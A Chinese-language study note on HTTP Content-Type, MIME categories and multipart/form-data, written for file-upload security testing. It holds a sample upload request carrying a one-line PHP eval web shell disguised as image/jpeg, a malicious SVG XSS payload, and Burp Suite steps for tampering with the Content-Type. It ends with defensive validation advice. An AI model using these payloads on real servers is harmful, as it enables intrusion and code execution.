- **什么是 Content-Type**

```
Content-Type 是 HTTP 头部的一个字段
作用：告诉接收方，这段数据是什么格式的，应该怎么处理

出现在两个地方：
  ├─ HTTP 请求头：客户端告诉服务器，我发给你的数据是什么格式
  └─ HTTP 响应头：服务器告诉浏览器，我返回给你的数据是什么格式

格式：
  Content-Type: 类型/子类型; 参数
  
  例如：
  Content-Type: text/html; charset=UTF-8
                ↑    ↑        ↑
               类型 子类型    参数（字符编码）

```

- **Content-Type 的总体分类**

```
Content-Type 的值称为 MIME 类型（Multipurpose Internet Mail Extensions）
由 IANA 组织统一注册管理

总体分为 8 大类：

┌─────────────┬──────────────────────────────
│ 类型         │ 含义                               
├─────────────┼──────────────────────────────
│ text        │ 文本类数据（可读的文字内容）           
│ image       │ 图像类数据                          
│ audio       │ 音频类数据                          
│ video       │ 视频类数据                          
│ application │ 应用程序特定格式的数据                
│ multipart   │ 多部分混合数据（文件上传用这个）       
│ font        │ 字体文件                            
│ model       │ 三维模型数据                        
└─────────────┴──────────────────────────────

```

# 6 multipart 类（多部分数据）

> 文件上传时最关键的类型

## 6.1 multipart/form-data(重要)

```
这是文件上传时 HTTP 请求使用的 Content-Type

HTML 表单：
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="text" name="username">
    <button type="submit">上传</button>
</form>

```

- **完整的 HTTP 请求结构**

```http
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 326

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="username"

admin
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg                      ← 这就是文件的 Content-Type
                                                 服务器读取的 $_FILES['file']['type']
                                                 攻击者可以随意修改这个值
<?php @eval($_POST['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--

```

- **结构拆解**

```
multipart/form-data 请求的组成：

┌─ 整体 Content-Type ──────────────────────────────────────┐
│  Content-Type: multipart/form-data; boundary=XXXX        │
│                                      ↑                   │
│                              分隔符（boundary）           │
│                              每个 part 之间的边界标志      │
└──────────────────────────────────────────────────────────┘

┌─ 普通文本字段 part ───────────────────────────────────────┐
│  --boundary                                              │
│  Content-Disposition: form-data; name="字段名"            │
│  （空行）                                                 │
│  字段值                                                   │
└──────────────────────────────────────────────────────────┘

┌─ 文件字段 part ───────────────────────────────────────────┐
│  --boundary                                              │
│  Content-Disposition: form-data; name="字段名";           │
│                        filename="文件名"   ← 用户可控      │
│  Content-Type: image/jpeg                 ← 用户可控      │
│  （空行）                                                 │
│  文件内容（二进制数据）                                     │
└──────────────────────────────────────────────────────────┘

┌─ 结束标志 ────────────────────────────────────────────────┐
│  --boundary--                                            │
└──────────────────────────────────────────────────────────┘

```

## 6.2 其他 multipart 类型

```
multipart/byteranges    断点续传时的分段响应
multipart/mixed         混合内容（邮件系统常用）
multipart/alternative   同一内容的不同格式版本（如纯文本+HTML 邮件）
multipart/related       相关联的多部分内容（如 HTML + 内嵌图片）

```

# 8 特殊值与安全相关说明

## 8.1 application/octet-stream 的特殊性

```
含义：未知的二进制数据流

浏览器行为：
  收到 Content-Type: application/octet-stream 的响应时
  → 浏览器不会尝试渲染或执行
  → 直接触发下载

安全应用：
  服务器提供文件下载时，设置此类型可防止浏览器执行文件
  即使下载的是 .html 或 .js 文件，浏览器也只会下载不执行
  
  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename="file.pdf"');

```

## 8.2 SVG 的特殊安全风险

```
image/svg+xml

SVG 是基于 XML 的矢量图格式
但 SVG 文件内可以嵌入 JavaScript 代码！

恶意 SVG 示例：
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

风险场景：
  1. 网站允许上传图片（包括 SVG）
  2. 上传后直接在页面中以 <img> 或内联方式显示
  3. 攻击者上传含 JS 的 SVG
  4. 其他用户访问页面时 JS 被执行 → 存储型 XSS

注意：
  <img src="evil.svg"> 通常不会执行 SVG 中的 JS
  直接内联 SVG 或 <object>/<embed> 标签才会执行

```

## 8.3 Content-Type 与实际文件内容不一致的情况

```
正常情况：
  Content-Type: image/jpeg  ←→  实际内容：JPEG 图片数据

攻击者构造的情况：
  Content-Type: image/jpeg  ←→  实际内容：PHP 代码
  
  服务器只验证 Content-Type → 认为是图片 → 通过校验
  但实际保存的是 PHP 代码   → 访问时被执行

正确的验证方式：
  不依赖 Content-Type
  而是读取文件内容本身来判断真实类型
  → getimagesize() / exif_imagetype() / 读取魔术字节

```

# 9 在 Burp Suite 中的实际操作

- **抓包后的修改位置**

```http
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=---------------------------1234

-----------------------------1234
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php        ← ① 这里是文件的 Content-Type
                                           对应 $_FILES['file']['type']

```

# 10 一张图总结

```
Content-Type 全景图

MIME 类型
│
├── text/           → 文本内容
│   ├── plain           纯文本
│   ├── html            网页
│   ├── css             样式
│   └── javascript      脚本
│
├── image/          → 图像（文件上传绕过常用伪造的类型）
│   ├── jpeg            ← 最常用于伪造
│   ├── png             ← 常用于伪造
│   ├── gif             ← 常用于伪造
│   └── svg+xml         ← 有 XSS 风险
│
├── audio/          → 音频
├── video/          → 视频
│
├── application/    → 应用数据（种类最多）
│   ├── octet-stream    未知二进制（触发下载）
│   ├── json            JSON 数据（API 接口常用）
│   ├── x-www-form-urlencoded  普通表单提交
│   ├── pdf / zip 等    各类文件格式
│   └── x-php / x-sh   ← 脚本类型，上传时危险
│
├── multipart/      → 多部分数据
│   └── form-data       ← 文件上传的核心类型
│                          包含 boundary 分隔符
│                          每个 part 有独立的 Content-Type
│
└── font/           → 字体文件

```

> 💡 **核心记忆点**
> - **文件上传请求** 的整体 `Content-Type` 是 `multipart/form-data`
> - **每个上传文件** 在 multipart 中有自己独立的 `Content-Type`
> - `$_FILES['file']['type']` 读取的是 **文件 part 里的 Content-Type**
> - 这个值**完全由客户端控制**，服务器不能以此判断文件真实类型
> - 真正安全的校验应该读取**文件内容本身**（魔术字节/getimagesize）
